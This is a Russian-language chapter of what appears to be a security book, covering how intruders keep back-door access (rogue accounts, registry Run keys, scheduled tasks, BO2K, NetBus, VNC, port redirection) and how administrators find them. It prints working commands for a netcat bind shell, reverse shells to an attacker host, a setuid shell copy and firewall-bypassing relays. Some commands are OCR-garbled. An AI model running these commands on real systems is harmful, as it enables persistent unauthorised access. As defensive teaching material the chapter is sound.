<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html;charset=windows-1251">
</head>
<link rel="stylesheet" href="../STYLE.css">
<body TEXT="#000000" BGCOLOR="#E7E3E7" LINK="#004080" VLINK="#004080" olink="#008080" Background="">
<table BORDER=0   COLS=3 WIDTH="16%" >
  <tr> 
    <td><a href="Index2.html"><img SRC="Back.gif"  BORDER=0 ></a></td>
    <td WIDTH="10%"><a href="../menu.html"><img SRC="Menu.gif" BORDER=0 ></a></td>
    <td ALIGN=RIGHT><a href="Index4.html"><img SRC="For.gif" BORDER=0 ></a></td>
  </tr>
</table>

 
<br>
<table width="100%" border="0">
  <tr>
    <td class="Text_n">
 
<p class="Tit_CN">

&quot;Потайные ходы&quot;</P>

<p class="Text_n">
Если непрошеные гости обоснуются в системе, избавиться от них бывает трудно. Даже если брешь, которой они воспользовались, будет найдена и закрыта, злоумышленники могут обеспечить специальный механизм и быстро получить доступ в любое время. Такой механизм называется потайным ходом (back door).
<br>

Выявление и устранение такого потайного хода — задача почти неосуществимая, поскольку его можно создать самыми разнообразными способами. Единственной реальной возможностью восстановления системы после взлома является повторная установка операционной системы с исходных носителей и выполнение долгой и кропотливой работы по
восстановлению пользовательских данных и приложений с проверенных резервных копий. При этом полное восстановление осуществить очень трудно, особенно, если система имела нестандартную конфигурацию, которая не была документирована.
<br>

В следующих разделах описаны основные механизмы, которые используются злоумышленниками для сохранения контроля над системой. Знание этих методов поможет администратору быстро идентифицировать такие вторжения и по возможности сократить трудоемкость процесса восстановления. Где это необходимо, мы представим подробное описание возможных подходов, однако в основном предполагается дать как можно более полный обзор популярных методов.
<br>
<P align="center">
<span class="Text_b">
Создание фиктивных учетных записей</span></P>
<br>
<p class="Text_n">
Почти каждому системному администратору известно, что учетные записи с правами суперпользователя — это такие ресурсы, которые легко защищать и контролировать. А вот учетные записи, равные по привилегиям суперпользователю, но имеющие неприметные имена, отследить намного труднее. Злоумышленник обязательно попытается создать такие учетные записи.
<br>
<P align="center">
<span class="Text_b">
NT/2000</span></P>
<br>
<p class="Text_n">
В Windows NT/2000 привилегированные локальные учетные записи легко создать с помощью следующих команд.
<br>
<p class="Code">
net user &lt;имя_пользователя&gt;&lt;пароль&gt;/ADD<br>
net localgrcup &lt;имя_группы&gt;&lt;имя_пользователя&gt;/ADD<br>
</p>

С помощью команды net group можно добавить пользователя в глобальную группу. Вспомните, что в системе NT есть отличие между локальной (содержащейся только в локальной базе данных SAM) и глобальной (из доменной базы данных SAM) группами. Встроенные локачьные группы обычно предоставляют более широкие возможности, поскольку с их помощью можно предоставлять различный уровень доступа к системным ресурсам. В операционную систему Win 2000 добавлены новые универсальные группы и локальные группы домена. По сути, эти понятия являются метадоменными, так как они могут быть членами любого домена, принадлежащего дереву или лесу.
<br>

Вывести список всех членов основных административных групп так же легко, как и добавить в них новую учетную запись. Как показано в следующем примере, в котором на экран выводится список членов группы Windows 2000 Enterprise Admins (администраторы предприятия), это можно сделать с помощью команды
<span class="Text_b"> net [local] group</span>.
<br>
<p class="Code">
C:\&gt;<span class="Text_b">net group &quot;Enterprise Admins&quot;</span><br>
Group name Enterprise Admins<br>
Comment    Disighated administrators of the enterprise<br>
Members<br>
------------<br>
Administrator<br>
The command completed successfully.<br>
</p>

В первую очередь нужно просмотреть встроенные группы: Administrators, Domain Admins, Enterprise Admins и Schema Admins (на контроллерах домена), а также различные локальные группы операторов.
<br>
<P align="center">
<span class="Text_b">
UNIX</span></P>
<br>
<p class="Text_n">
В системе UNIX фиктивные учетные записи создаются и идентифицируются аналогичным образом. Как правило создаются безобидные учетные записи с нулевыми значениями идентификаторов UID и GID. Следует проверить также учетные записи с таким же идентификатором GID, что и у пользователя root, а затем проверить совпадение свойств групп в файле /etc/groups. Кроме того, такие учетные записи легко выявить по содержимому файла /etc/passwd.
<br>
<P align="center">
<span class="Text_b">
Novell</span></P>
<br>
<p class="Text_n">
В системе NetWare типичным является создание &quot;осиротевших&quot; объектов, т.е. создание, например, контейнера с одним пользователем, а затем передача этому новому пользователю прав опекунства над родительским контейнером. Если взломщик имеет возможность постоянно регистрироваться в дереве NDS, то эту ситуацию не сможет исправить даже администратор. Более подробную информацию о &quot;потайных ходах&quot; системы NetWare можно найти в главе 7.
<br>
<P align="center">
<span class="Text_b">
Загрузочные файлы</span></P>
<br>
<p class="Text_n">
В предыдущих главах много говорилось о &quot;потайных ходах&quot;, которые создаются с помощью механизмов загрузки, поддерживаемых различными платформами. Такой способ стал излюбленным методом злоумышленников, поскольку он позволяет устанавливать ловушки, которые активизируются при каждом перезапуске системы неосмотрительными пользователями.
<br>
<P align="center">
<span class="Text_b">
NT/2000</span></P>
<br>
<p class="Text_n">
В операционной системе Windows NT в первую очередь нужно проверить различные папки, находящиеся в папке Startup: %systemroot%\profiles\%username%\ start menu\programs\startup (папка All Users будет использоваться независимо от того, кто из пользователей зарегистрировался интерактивно). Кроме того, для запуска программ типа &quot;троянский конь&quot; или для установки &quot;потайного хода&quot; при каждом запуске системы взломщики могут воспользоваться параметрами системного реестра. Нужно проверить следующие параметры
<br>

HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\&nbsp;
<br>
<ul>
  <li>&nbsp;...Run</li>
  <li>&nbsp;...RunOnce</li>
  <li>&nbsp;...RunOnceEx</li>
  <li>&nbsp;...RunServices</li>
  <li>&nbsp;...AeDebug&nbsp;</li>
  <li>&nbsp;...Winlogon</li>
</ul>

В этих параметрах хранятся данные многих из потенциально опасных программ. Например, программа Back Orifice 2000 (ВО2К; см. ниже) устанавливается как служба удаленного администрирования (Remote Administrator Service) в параметре RunServices.
<br>

Из предыдущих глав вы узнали, как можно создать &quot;потайной ход&quot; в системе NT с помощью драйверов устройств, загружающихся во время запуска системы. Драйвер пакета Invisible Keylogger Stealth (IKS) (iks.sys, конечно же, переименованный более подходящим образом) может быть скопирован в каталог %systemroot%\system32\ drivers. При этом программа будет запускаться вместе с ядром NT, благодаря чему на консоли пользователя этот процесс обычно остается невидимым. Программа также записывает несколько значений в системный реестр в HKLM\SYSTEM\Current-ControlSet\Services\iks (опять же, параметр iks может быть переименован взломщиком так же, как и сам файл драйвера). Если заранее сделать надежную резервную копию системного реестра (используя утилиту DumpReg компании Somarsoft), то можно легко выявить &quot;следы присутствия&quot; IKS. Просмотрев с помощью проводника Windows свойства драйвера IKS, можно также установить его происхождение.
<br>
<P align="center">
<span class="Text_b">
Использование броузера Web для загрузки кода</span></P>
<br>
<p class="Text_n">
Появление в мае 2000 года сценария ILOVEYOU, написанного на языке Visual
Basic,&nbsp; послужило свидетельством того, что есть и другие способы запуска исполняемого кода: это установка начальной страницы, загружаемой при запуске Web-броузера.
<br>

Сценарий ILOVEYOU модифицировал параметры Internet Explorer так, чтобы в качестве
начальной использовалась страница, с которой загружался исполняемый файл с именем wiN-BUGSFlx.exe. Этот файл загружался с одного из четырех различных адресов URL, выбранных случайным образом на базе следующего общего шаблона.
<br>
<p class="Code">
http://www.skynet.net/-[переменная]/<br>
[длинная_строка_с_ненужной_информацией]/<br>
WIN-BUGSFlX.exe&quot;&nbsp;<br>
</p>

Данный адрес URL содержался в параметре системного реестра HKSU\Software\ Microsoft\Internet Explorer\Main\-Start Page. Этот сценарий изменял также несколько параметров системного реестра, включая тот, который запускает загруженные двоичные файлы при перезагрузке системы (предполагалось, что к нему был указан путь), и тот, который удаляет первоначальную страницу запуска.


<p class="label"><IMG src="1.gif"  ><br>
<br>
Рис. 14.1. В диалоговом окне Internet Explorer, содержащем предупреждающе сообщение, пользователь указывает, нужно ли загрузить файл на компьютер локально или запустить его с удаленного узла. Всегда устанавливайте режим Save this program to disk (сохранить программу на диске)!</p>

 <p class="Text_n">

<p class="Code">
HKLM\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX<br>
HKCUXSoftware\Microsoft\Internet Explorer\Main\Start Page\about:blank<br>
</p>

Конечно, в зависимости от степени доверчивости следующего пользователя, запускающего броузер, для выполнения этого файла перезагрузка может и не понадобиться. Последние версии Internet Explorer перед пересылкой определенных типов файлов, таких как исполняемые файлы . ЕХЕ и . СОМ, по умолчанию выводят на экран окно подтверждения. В зависимости от ответа пользователя на вопрос в диалоговом окне, показанном на рис. 14.1, данный файл может быть запущен сразу после начала работы Web-броузера.
<br>
<P align="center">
<span class="Text_b">
Контрмера: не запускайте исполняемые файлы, найденные в Internet!</span></P>
<br>
<p class="Text_n">
Должно быть понятно и без слов (хотя на протяжении многих лет это повторяется много раз): нужно быть предельно осторожным по отношению к исполняемым файлам, загружаемым из Internet. Запуск файлов с удаленного сервера — это путь, ведущий прямо к катастрофе. Вместо этого лучше загрузить их на свой компьютер локально, проверить на наличие вирусов, по возможности проанализировать содержимое (например, файлов сценариев или командных файлов), а затем протестировать их на какой-нибудь второстепенной системе.
<br>
<P align="center">
<span class="Text_b">
UNIX</span></P>
<br>
<p class="Text_n">
В системе UNIX взломщики часто помещают программы, предназначенные для создания &quot;потайного хода&quot;, в файлы rc.d. Следует проверить каждый из таких файлов и убедиться, что в них не содержится ни одной незнакомой программы или такой, которая была бы недавно добавлена. Для внедрения ловушек может быть использован также файл inetd.conf. В этом файле находятся параметры демона inetd, суперсервера Internet системы UNIX, который при необходимости динамически запускает различные процессы, такие как FTP, telnet, finger и т.д. В этом файле также можно обнаружить подозрительные демоны.
<br>

Другим методом определения изменений в системных файлах систем UNIX или NT является использование программы Tripwire
(<span class="Text_b">http://www.tripwire.com</span>). Коммерческая версия этой популярной программы может работать на многих платформах, включая Windows NT 4.0 SP3 и выше, Red Hat Linux 6.1 и Solaris 2.6 и 7. Эта программа создает сигнатуру каждого автономно хранящегося файла. |&pound;сли файл был изменен без ведома его владельца, то программа Tripwire сообщит, когда и как в него были внесены изменения.
<br>
<P align="center">
<span class="Text_b">
Novell</span></P>
<br>
<p class="Text_n">
Файлы startup.ncf и autexec.ncf системы NetWare позволяют определить, какие программы, параметры и загружаемые модули системы NetWare (NLM — NetWare Loadable Module) будут запущены при загрузке сервера. Взломщики могут отредактировать один или несколько файлов . NCF, которые вызываются из этих загрузочных файлов (например, файл Idremote.ncf) и, таким образом, создать &quot;потайной ход&quot;, например запустить хакерскую программу rconsole. Поэтому периодически проверяйте каждый загрузочный файл, чтобы не упустить момент создания взломщиками &quot;потайного хода&quot;.
<br>

Загрузочные файлы — очень удобное, но далеко не единственное средство создания &quot;потайного хода&quot;. Для этого подходят также очереди запланированных заданий. В системе Windows NT эта возможность обеспечивается службой Schedule, доступ к которой можно получить с помощью команды AT. Запланировав регулярный запуск требуемой программы, взломщики могут быть уверены, что нужная им служба будет всегда запущена и готова к работе.
<br>
<P align="center">
<span class="Text_b">
Запланированные задания</span></P>
<br>
<p class="Text_n">
Например, в системе Windows NT простой &quot;потайной ход&quot; можно реализовать, установив утилиту netcat, которая будет ежедневно запускаться в назначенное время.
<br>
<p class="Code">
C:\&gt;<span class="Text_b">at\\192.168.202/44 12:ООА /every:! <br>
&quot;&quot;nc -d -L -р 8080 -е cmd.exe&quot;</span><br>
Added a  new  job with  job  ID =  2<br>
</p>

С помощью этой команды каждый день в полдень будет инициироваться новая программа прослушивания порта 8080. Злоумышленник сможет без проблем подключиться к целевому компьютеру с помощью утилиты netcat и получить в свое распоряжение командную оболочку, периодически удаляя ранее запущенные экземпляры netcat. Кроме того, можно воспользоваться также командным файлом, чтобы сначала проверить, запущена ли утилита netcat, а затем при необходимости осуществить ее запуск.
<br>

В системе UNIX планирование выполнения процессов осуществляется с использованием программы crontab. Она часто применяется для автоматизации трудоемкого процесса поддержки системы, но может быть использована также и для создания &quot;потайных ходов&quot;. В большинстве систем UNIX файл crontab можно редактировать с помощью команды crontab -e, при этом данный файл будет открыт в определенном редакторе (который обычно задается с помощью переменных окружения VISUAL
или EDITOR).
<br>

Чаще всего &quot;потайной ход&quot; можно создать в системе, в которой программа crontab запускается с правами суперпользователя и используется для вызова командных файлов. Если для этих командных файлов взломщик задаст права доступа, позволяющие редактировать их посторонним пользователям, то он сможет легко вернуться в систему в качестве обычного пользователя и сразу же получить привилегии root. В файле crontab это можно осуществить с помощью следующих команд.
<br>
<p class="Code">
<span class="Text_b">ср /bin/csh /tmp/evilsh<br>
chmod 4777 /tmp/evilsh</span><br>
</p>
<P align="center">
<span class="Text_b">
Контрмеры: защита от запланированных заданий</span></P>
<br>
<p class="Text_n">
Для того чтобы предотвратить эту атаку в системе NT, с использованием команды at проверьте список заданий на предмет наличия в нем несанкционированных заданий.
<br>
<p class="Code">
С:\&gt;  <span class="Text_b">at</span><br>
Status ID  Day    Time     Command Line<br>
---------------------------------<br>
0  Each 1 12:00 AM  net localgroup administrators joel /add<br>

</p>

Затем с помощью следующей команды завершите  подозрительные  процессы с идентификатором 0.&nbsp;
<br>

<span class="Text_b">C:\&gt;at  \\172.29.11.214   0   /delete</span>
<br>

Альтернативный способ заключается в завершении работы службы с помощью команды net stop schedule, а затем запрещении ее запуска с помощью команды Control
Panel&gt;Services.
<br>

В системе UNIX представляющие опасность команды можно поискать в файлах crontab. Кроме того, проверьте права доступа, связанные с используемыми файлами и сценариями.
<br>
<P align="center">
<span class="Text_b">
Удаленное управление</span></P>
<br>
<p class="Text_n">
Вполне возможна ситуация, когда взломщик не сможет вернуться на целевой компьютер, даже обладая необходимыми регистрационными данными. Это может произойти, если некоторые служебные процессы сервера не выводят приглашения на регистрацию. Например, мало пользы от пароля root, если на взламываемом сервере отключены г-службы или telnet. Точно так же в системе Windows NT администратор по умолчанию получает очень ограниченные возможности удаленного управления. Поэтому первоочередная цель взломщика состоит в обеспечении механизмов повторного доступа.
<br>

В большинстве случаев все, что действительно нужно взломщику, — это удаленная командная строка. Ниже представлен обзор средств, с помощью которых достаточно просто получить удаленный доступ к командной оболочке. Кроме того, учитывая широкую распространенность операционных систем с графическим интерфейсом и предоставляемую ими простоту управления, вы познакомитесь с инструментами, которые окажутся полезными и в этом случае.
<br>

Контрмеры против средств удаленного управления приводятся в конце раздела, поскольку большинство из них можно применять для защиты от всех из описанных атак.
<br>
<P align="center">
<span class="Text_b">
netcat</span></P>
<br>
<p class="Text_n">
В этой книге ранее уже упоминался &quot;швейцарский армейский нож&quot;, утилита netcat (ее версии как для системы NT, так и для UNIX можно найти по адресу<span class="Text_b">
http.//www. 10pht.com/~weld/netcat/index.html</span>). С помощью этой программы можно незаметно прослушивать нужный порт, выполняя заранее определенные действия после установки удаленного соединения с системой. Утилита netcat окажется чрезвычайно мощным средством удаленного управления, если эти действия будут направлены на запуск командной оболочки. Затем злоумышленники могут подключиться с помощью netcat к заданному порту и получить в свое распоряжение командную оболочку. Команды запуска netcat в режиме прослушивания обычно скрытно помещаются в какой-нибудь загрузочный файл (см. предыдущий раздел), поэтому эта программа прослушивания портов будет активизироваться при каждой перезагрузке системы. Пример такого &quot;потайного хода&quot; показан на рис. 14.2, на котором виден параметр системного реестра Windows NT, приводящий к запуску утилиты netcat в процессе загрузки системы.
<br>
<p class="Prim">
Сообразительные взломщики обязательно замаскируют своего &quot;троянского коня&quot; netcat. Для этого можно дать программе какое-нибудь нейтральное имя, например ddedll32.exe, или такое, что администратор дважды подумает, прежде чем удалит такой файл.
</p>

Параметр -L утилиты netcat дает возможность возобновить работу при многократном нарушении связи; при использовании ~d программа netcat запускается в скрытом режиме (без интерактивной консоли); а -е позволяет задать запускаемую программу, в данном случае командный интерпретатор NT cmd.exe. Параметр -р определяет прослушиваемый порт (в данном примере 8080). Версию программы netcat для системы UNIX можно легко настроить так. чтобы запускалась командная оболочка /bin/sh, что приведет к тому же результату. После этого взломщику останется только соединиться с портом, который прослушивается утилитой netcat, и получить в свое распоряжение удаленную командную оболочку.


<p class="label"><IMG src="2.gif" ><br>
<br>
Рис. 14.2. В системном реестре NT4 установлено, что в процессе загрузки системы будет загружаться утилита netcat</p>

 <p class="Text_n">

<P align="center">
<span class="Text_b">
remote.exe (NT)</span></P>
<br>
<p class="Text_n">
Утилиту remote из набора NTRK можно запустить в качестве сервера, чтобы командная строка возвращалась любому аутентифииированному пользователю NT, который подключился с помощью соответствующего удаленного клиента. Эту программу очень просто установить (нужно просто скопировать файл remote.exe в системный каталог, например %systemroot%). Поэтому зачастую ее использование предшествует последующей установке более опасных программ, таких как графические утилиты удаленного управления или программы-регистраторы нажатия клавиш. Более подробно утилита remote.exe описана в главе 5.
<br>
<P align="center">
<span class="Text_b">
loki</span></P>
<br>
<p class="Text_n">
Программы loki и lokid, кратко рассмотренные в главе 11. предоставляют взломщикам простой механизм повторного получения доступа к взломанной системе, даже если она расположена позади брандмауэра. Оригинальность этих программ заключается в том, что клиент (loki) помещает команды взломщика (в основном это пакеты IP) в заголовки ICMP или UDP и отсылает их серверу (lokid), который выполняет их и возвращает результаты. Поскольку многие брандмауэры допускают прохождение на сервер пакетов ICMP и UDP, то инициированный взломщиком трафик зачастую без проблем проходит через брандмауэр. Сервер lokid запускается с помощью следующей команды.
<br>

<span class="Text_b">
lokid  -p  -i v 1</span>
<br>

Затем для запуска клиента нужно ввести такую команду.<span class="Text_b"> loki   -d  172.29.11.191
-p -i -v 1 -t  3</span>
<br>

Используемые совместно, утилиты loki и lokid обеспечивают постоянный &quot;потайной ход&quot; в систему, иногда даже через брандмауэр.
<br>
<P align="center">
<span class="Text_b">
Back Orifice и NetBus</span></P>
<br>
<p class="Text_n">
Хотя оба этих средства по своей природе являются графическими (NetBus даже предоставляет некоторые возможности по управлению рабочим столом), они главным образом удаленно вызывают функции программного интерфейса API. Так что лучше их расценивать их как инструменты создания &quot;потайных ходов&quot;, предназначенные для выполнения удаленных команд, а не как графические утилиты удаленного управления. Возможности каждой из этих утилит описаны в главах 4 и 5. Здесь же мы лишь еще раз перечислим те места, в которых взломщики могут скрытно размещать эти средства, чтобы администраторам было легче их разыскать.
<br>

Сервер Back Orifice (ВО) можно настроить так, чтобы он устанавливался и запускался под любым именем (по умолчанию используется имя [пробел] ,ехе). При этом в параметр
HKEY_LOCAL_MACHINE\Software\Microsoft\ Windows\CurrentVersicn\RunServices добавляется новая запись, так что сервер ВО будет запускаться каждый раз при загрузке системы и прослушивать порт 31337, если не задано другого значения. (Угадайте, почему выбран именно этот порт?)
<br>

Летом 1999 года вышла новая версия пакета Back Orifice. Back Orifice 2000 (BO2K.
<span class="Text_b">http://www.bo2k.com</span>), обладающая всеми возможностями своей предшественницы, но с двумя примечательными особенностями. Его можно использовать в Windows NT/2000 (а не только Win 9.x), а, кроме того, имеется комплект инструментов разработчика, позволяющий создавать модификации программы, что значительно затрудняет ее обнаружение. По умолчанию программа ВО2К самостоятельно копируется в файл UMGR32.EXE каталога %systemroot% и прослушивает TCP-порт 54320 или UDP-порт 54321. При этом в списке процессов сервер ВО2К отображается под именем EXPLORER, что предотвращает попытки его удаления. Если программа работает в скрытом режиме, то она устанавливается в качестве службы с именем Remote Administration Service (служба удаленного администрирования) и в параметре системного реестра
HKLM\SOFTWAREXMicrosoft\ Windows\CurrentVersion\RunServices содержатся соответствующие данные. При этом запуск &quot;службы&quot; выполняется при загрузке системы, л исходный файл удаляется. Все эти параметры легко изменить с помощью утилиты bo2kcfg.exe, которая входит в состав пакета.
<br>

Программа NetBus также является достаточно легко настраиваемой, и в Internet можно найти несколько ее версий. По умолчанию исполняемый файл сервера называется patch.exe, хотя он может иметь и любое другое имя. Для того чтобы это серверное приложение запускалось каждый раз при загрузке системы, в параметр
HKEY_LCAL_MACHINE\Software\Microsoft\ Windows\CurrentVersion\Run помещается соответствующая запись. По умолчанию программой NetBus прослушивается порт TCP 12345 или 20034 (при желании эти значения также можно изменить).
<br>
<P align="center">
<span class="Text_b">Контрмеры: защита против Back Orifice (и других программ)</span></P>
<br>
<p class="Text_n">
Попытки использования Back Orifice (а также служб FTP, telnet, SMTP, HTTP и т.д.) легко обнаружить, используя бесплатную утилиту фирмы Network Flight Recorder, которая называется BackOfficer Friendly
(<span class="Text_b">http://www.nfr.net/products/bof/</span>). Эта программа с графическим интерфейсом работает в режиме прослушивания портов и сообщает обо всех попытках соединения с системой. Ее самой замечательной особенностью является режим Fake Replies (ложные ответы). При его использовании программа будет отвечать на telnet-запросы и записывать имена и пароли, с помощью которых взломщики пытаются получить доступ. Как видно из следующего рисунка, программа выполняет большую работу по отслеживанию попыток проникновения в систему.


<p class="label"><IMG src="3.gif"  ><br>
</p>

 <p class="Text_n">
Если известен пароль, то программу ВО2К можно легко удалить на удаленном компьютере. Для этого с помощью клиентского приложения нужно соединиться с сервером, в диалоговом окне раскрыть папку Server Control и выбрать команду Shutdown Server с параметром DELETE.
<br>
<P align="center">
<span class="Text_b">
Перенаправление портов: реверсивный ceaнc
telnet, netcat, datapipe, rinetd и fpipe</span></P>
<br>
<p class="Text_n">
В предыдущих разделах некоторые команды
удаленного управления, основанные на использовании командного процессора, описывались в контексте прямых соединений. Теперь рассмотрим ситуацию, когда прямому вмешательству в систему что-то препятствует, например прямой доступ блокируется брандмауэром. Изобретательные взломщики могут обойти эти препятствия с помощью перенаправления портов (port redirection).
<br>

Если взломщику удалось взломать брандмауэр, то с помощью перенаправления портов он сможет направить все пакеты на требуемый узел. Важно уяснить возможные последствия взломов этого типа, поскольку взломщик может получить доступ к любой системе, которая находится позади брандмауэра. Перенаправление функционирует по следующему принципу: ведется прослушивание определенных портов и перехваченные на них необработанные пакеты перенаправляются на нужный вторичный адрес. Ниже будут рассмотрены некоторые методы выполнения перенаправления портов вручную, используя такие утилиты, как telnet и netcat, а также такие специализированные средства перенаправления, как datapipe и rinetd.
<br>
<P align="center">
<span class="Text_b">
Реверсивный сеанс telnet</span></P>
<br>
<p class="Text_n">
Один из любимых взломщиками &quot;потайных ходов&quot; во взломанную систему может быть реализован с помощью демона telnet, входящего в комплект поставки многих версий UNIX. Так что эту программу даже не потребуется загружать. Мы называем этот способ реверсивный сеанс telnet, потому что в процессе его реализации утилита telnet используется для соединения с находящейся в режиме прослушивания утилитой netcat, запущенной на компьютере взломщика. Затем требуемые команды направляются на целевой узел, а результаты их выполнения — обратно.
<br>

Чтобы реализовать реверсивное соединение telnet, на своем компьютере сначала нужно запустить два экземпляра утилиты netcat, используя для этого две отдельные команды.
<br>
<p class="Code">
С:\&gt; <span class="Text_b">nc -w -1 -р 80</span><br>
D:\&gt; <span class="Text_b">nc -w -1 -р 25</span><br>
</p>

Затем на целевом узле следует использовать следующую команду UNIX,
<br>
<p class="Code">
 <span class="Text_b">sleep 10000 |  telnet 172.29.11.191 80 |<br>
    /bin/sh  |  telnet 172.29.11.191 25</span><br>
</p>

В результате входные данные с порта 25 с помощью конвейера будут переданы локальной командной оболочке (которая выполнит полученные команды), а результаты снова через конвейер будут перенаправлены обратно, на порт 80 компьютера взломщика.
<br>
<p class="Prim">
Порты из предыдущего примера (80 и 25) используются стандартными службами (HTTP и SMTP соответственно). Поэтому обычно следующий через них поток сообщений свободно проходит через брандмауэр на многие внутренние узлы.
</p>
<P align="center">
<span class="Text_b">
Захват командной оболочки с помощью
утилиты netcat</span></P>
<br>
<p class="Text_n">
Если на целевой компьютер можно поместить утилиту netcat, или если она там уже установлена, то можно воспользоваться аналогичным методом. Такой подход мы называем &quot;захват командной оболочки&quot;, потому что его суть заключается в том, что на своем рабочем компьютере взломщик получает в полное распоряжение все функциональные возможности удаленной командной оболочки. Рассмотрим пример, когда в удаленной командной строке запускается следующая команда.
<br>
<p class="Code">
nс attacker.com 80 | cmd.exe | nс attacker.com 25<br>
</p>

Если хакер на своем компьютере attacker.com с помощью утилиты netcat осуществляет прослушивание TCP-портов 80 и 25 и при этом порт 80 разрешает передачу входящих, а порт 25 — исходящих пакетов для компьютера-жертвы через брандмауэр, то эта команда позволяет &quot;захватить&quot; командную оболочку удаленной системы. На рис. 14.3 показан экран компьютера взломщика, где в верхнем окне на порт 80 передается команда ipconf ig, а результаты ее выполнения направляются в порт 25 и отображаются в нижнем окне.


<p class="label"><IMG src="4.gif" ><br>
<br>
Рис. 14.3. Запустив утилиту netcat на компьютере взломщика (на рисунке показан его рабочий стол) и на целевом узле, можно &quot;захватить&quot; удаленную командную оболочку. Команды, которые вводятся в верхнем окне, выполняются на удаленной системе, а результаты их работы — в нижнем</p>

 <p class="Text_n">

<P align="center">
<span class="Text_b">
datapipe</span></P>
<br>
<p class="Text_n">
Реализация перенаправления портов с помощью утилиты netcat и ручная настройка этого процесса может оказаться довольно хлопотным делом. В Internet можно найти несколько программ, которые предназначены специально для этих целей. В системе UNIX очень популярна утилита datapipe. С ее помощью взломщик может обеспечить перенаправление данных так, чтобы пакеты принимались через порт 65000 и переадресовывались в систему NT (порт 139). Далее, на своем компьютере злоумышленник может настроить систему для выполнения прямо противоположных действий: запустить утилиту datapipe для прослушивания порта 139 и перенаправления сообщений на порт 65000 целевой системы. Например, для нападения на систему NT (172. 29.11.100), расположенную позади
брандмауэра, на взломанном узле (172.29.11.2) нужно выполнить следующую команду.
<br>
<p class="Code">
<span class="Text_b">datapipe 65000 139 172.29.11.100</span>
</p>

Затем на собственном компьютере взломщику необходимо запустить утилиту datapipe для прослушивания порта 139 и пересылки полученных данных на порт 65000 взломанного узла.
<br>
<p class="Code">
<span class="Text_b">datapipe 139 65000 172.29.11.2</span>
</p>

Теперь через брандмауэр открыт доступ к системе NT (172.23.11. ICO). На рис. 14.4 показан пример реализации перенаправления портов и продемонстрирована эффективность этого метода. С помощью такого подхода можно обойти брандмауэры с фильтрацией пакетов, пропускающие сообщения, предназначенные для портов с большими номерами.
<br>
<P align="center">
<span class="Text_b">
rinetd</span></P>
<br>
<p class="Text_n">
Утилита rinetd — это &quot;сервер перенаправления Internet&quot;, созданный Томасом Бутеллом
(Thomas Boutell). Эта программа перенаправляет соединения TCP с одного IP-адреса и порта на другой. Таким образом, она. во многом похожа на программу datapipe. Программа работает как на базе интерфейса Win32 (включая Windows 2000), так и в системе Linux УТН..ПГ rinetd очень легко использовать: нужно просто создать конфигурационный
файл, в котором указывается правило перенаправления. Этот файл имеет следующий формат
<br>
<p class="Code">
адрес_привязки порт_прмвязки адрес_соединения порт_соединения
</p>

Запустить программу можно с помощью команды rinetd -с &lt;имя_конфигурационного_файла&gt;. Так же как и datapipe, эта утилита может оказаться очень эффективной против неправильно настроенного брандмауэра.
<br>
<P align="center">
<span class="Text_b">
fpipe</span></P>
<br>
<p class="Text_n">
Утилита fpipe предназначена для передачи/перенаправления данных с порта TCP. Ее разработали авторы этой книги, занимающие ключевые позиции в компании Foundstone, Inc. Эта программа создает поток TCP. исходящий из выбранного пользователем порта. Она прекрасно подходит для перенаправления, представленного на рис. 14.4, и в системе Windows может послужить равноценной заменой программы datapipe, применимой только к UNIX.
<br>

Одна из особенностей утилиты fpipe, отличающих ее от других средств перенаправления портов, которые можно использовать в системе Windows (таких как rinetd), заключается в возможности задания исходного порта передаваемого трафика. Чтобы оценить &quot;проникающую&quot; способность этой программы, нужно попробовать &quot;обмануть&quot; с ее помощью брандмауэр или маршрутизатор, которые пропускают поток сообщений лишь с
определенных портов (например, пакеты с TCP-порта 25 могут обрабатываться почтовым сервером). Обычно в протоколе TCP/IP исходным портам, используемым для клиентских соединений, назначаются большие номера, а соответствующий поток сообщений фильтруется брандмауэром. Однако может оказаться, что брандмауэр пропускает трафик DNS (а в большинстве случаев это именно так). Тогда с помощью утилиты fpipe можно обеспечить прохождение этого потока с определенного исходного порта. В такой ситуации брандмауэр рассматривает этот поток как разрешенный и пропускает его.


<p class="label"><IMG src="5.gif"><br>
<br>
Рис. 14.4. Перенаправление портов</p>

 <p class="Text_n">


<p class="Prim"> Пользователи должны знать, что, если при задании порта-источника исходящего соединения был использован параметр -в и это соединение было закрыто, может оказаться невозможным установить его повторно (утилита fpipe сообщит, что адрес уже используется) до того момента, пока не истекут интервалы ожидания TIME_WAIT и CLOSE_WAIT, определяемые протоколом TCP. Эти интервалы ожидания могут варьироваться в диапазоне от 30 секунд до четырех минут и более, в зависимости от используемой версии операционной системы и ее версии. Эти интервалы ожидания определяются протоколом TCP и не являются ограничением самой утилиты fpipe. Причина возникновения такой ситуации заключается в том, что утилита fpipe пытается установить новое соединение с удаленным узлом с применением тех же комбинаций локальных
IР-адреса/порта и удаленных IP-адреса/порта, что и в предыдущем сеансе. Новое же соединение не может быть установлено до тех пор, пока стеком протоколов TCP не будет решено, что предыдущее соединение не было полностью завершено.
</p>
<P align="center">
<span class="Text_b">
VNC</span></P>
<br>
<p class="Text_n">
Рассмотренные ранее средства удаленного управления предоставляют возможность практически полного контроля над системой. Поэтому при одной только мысли о возможности получения в свои руки виртуального рабочего стола целевой системы у взломщиков учащается сердцебиение. Программа Virtual Network Computing (VNC) предоставляет именно такие возможности. Кроме того, этот программный продукт легко установить на &quot;захваченной&quot; системе и использовать ее как &quot;потайной ход&quot;, обеспечивающий получение доступа впоследствии.
<br>

Пакет VNC разработан в лаборатории AT&amp;T Laboratories Кембриджского университета, и, несомненно, является лучшим бесплатным графическим средством удаленного управления. В главе 5 было показано, как легко инсталлировать эту программу в Windows NT через удаленное сетевое соединение. Для этого нужно лишь установить службу VNC из командной строки, сделав перед этим единственное изменение в системном реестре, чтобы обеспечить ее скрытный запуск (версии выше 3.3.2 помешают пиктограмму на панель задач и могут быть легко обнаружены пользователями, которые зарегистрировались интерактивно). Конечно же, независимо от версии или выбранного режима процесс winVNC. EXE будет отображен в списке процессов.
<br>
<P align="center">
<span class="Text_b">
Взлом X Windows и других графических терминальных служб</span></P>
<br>
<p class="Text_n">
